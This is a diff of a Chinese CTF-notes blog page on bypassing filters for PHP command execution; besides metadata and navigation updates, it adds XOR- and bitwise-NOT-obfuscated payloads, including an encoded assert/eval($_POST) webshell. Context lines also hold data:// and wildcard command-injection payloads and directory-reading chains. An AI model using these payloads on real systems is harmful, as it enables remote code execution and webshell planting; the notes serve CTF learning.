@@ -38,7 +38,7 @@
 <meta property="og:image" content="http://example.com/2025/03/04/images/20250311203652981.png">
 <meta property="og:image" content="http://example.com/2025/03/04/images/20250311203744790.png">
 <meta property="article:published_time" content="2025-03-04T13:10:47.000Z">
-<meta property="article:modified_time" content="2025-03-11T13:34:57.149Z">
+<meta property="article:modified_time" content="2025-03-29T03:31:33.522Z">
 <meta property="article:author" content="fuboy">
 <meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
@@ -212,7 +212,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">38</div>
+    <div class="sidebar-state-number">62</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -220,7 +220,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">18</div>
+    <div class="sidebar-state-number">35</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -285,7 +285,7 @@
       <div class="article-date">
   <a href="/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-03-04T13:10:47.000Z" itemprop="datePublished">2025-03-04</time>
-    <time style="display: none;" id="post-update-time">2025-03-11</time>
+    <time style="display: none;" id="post-update-time">2025-03-29</time>
   </a>
 </div>
 
@@ -313,6 +313,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span><br><span class="line">也可以日志包含</span><br><span class="line">c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 <h2 id="无字母数字rec"><a class="markdownIt-Anchor" href="#无字母数字rec"></a> 无字母数字rec</h2>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">或</span><br><span class="line">异或</span><br><span class="line">自增</span><br><span class="line">取反</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法_php过滤绕过-CSDN博客</a></p>
+<p>异或：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>
+<p>取反：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;echo urlencode(~&#x27;phpinfo&#x27;);&quot;                                      </span><br><span class="line">%8F%97%8F%96%91%99%90</span><br><span class="line">PS C:\Users\Administrator&gt; </span><br><span class="line"></span><br><span class="line">payload: ?code=(~%8F%97%8F%96%91%99%90)();</span><br><span class="line"></span><br><span class="line">getshell：</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=&#x27;assert&#x27;;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$c=&#x27;(eval($_POST[mochu7]))&#x27;;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo $d;</span><br><span class="line"> ?&gt;</span><br><span class="line">(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  //别忘了后面的分号</span><br><span class="line">检验：mochu7=phpinfo();</span><br><span class="line">或者：</span><br><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>
 <p>若有更高级限制考虑：</p>
 <p><strong>法一：</strong></p>
 <p>.(点)的用法，就是<strong>相当于source 可以执行sh命令</strong></p>
@@ -335,7 +340,7 @@
 <p>数组移动操作：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
 <p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">  //查看和读取根目录文件</span><br><span class="line">  //查看和读取根目录文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));//查看和读取当前目录文件</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">  //查看和读取根目录文件</span><br><span class="line">  //查看和读取根目录文件</span><br></pre></td></tr></table></figure>
 <h2 id="用linux路径构造命令"><a class="markdownIt-Anchor" href="#用linux路径构造命令"></a> 用Linux路径构造命令</h2>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;???????? //构造cat</span><br><span class="line">c=/bin/c??$IFS????????</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br><span class="line">若不能传入字母，需变为</span><br><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>
@@ -486,13 +491,13 @@ command1 || command2 [|| command3 …]</p>
     
       <div class="article-nav-link-wrap article-nav-link-left">
         
-          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-sql" class="lazyload">
+          <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="BaseCTF2024" class="lazyload">
         
-        <a href="/2025/03/09/CTFSHOW-sql/"></a>
+        <a href="/2025/03/05/BaseCTF2024/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            CTFSHOW-sql
+            BaseCTF2024
           
         </h3>
       </div>
@@ -546,10 +551,10 @@ command1 || command2 [|| command3 …]</p>
     
       <div>
         <span class="icon-brush"></span>
-        62.9k
+        91.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        04:11
+        06:19
       </div>
     
     
@@ -594,7 +599,7 @@ command1 || command2 [|| command3 …]</p>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">38</div>
+    <div class="sidebar-state-number">62</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -602,7 +607,7 @@ command1 || command2 [|| command3 …]</p>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">18</div>
+    <div class="sidebar-state-number">35</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -729,7 +734,7 @@ command1 || command2 [|| command3 …]</p>
           description: "",
           stripContent: " 小知识 12345include不用括号，分号可以用?&amp;gt;代替。 //c=include$_GET[1]?&amp;gt;&amp;amp;1=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;);?&amp;gt;若想截断后面语句：%0a、%26、||&amp;lt;、&amp;lt;&amp;gt;、$&amp;#123;IFS&amp;#125;可以绕过空格过滤  无过滤： 12345678910111213141516171819通配符payload1:c=system(&amp;quo",
           date: "Tue Mar 04 2025 21:10:47 GMT+0800",
-          updated: "Tue Mar 11 2025 21:34:57 GMT+0800",
+          updated: "Sat Mar 29 2025 11:31:33 GMT+0800",
           cover: "/../images/1737907114de8a.jpg",
         };
       </script>
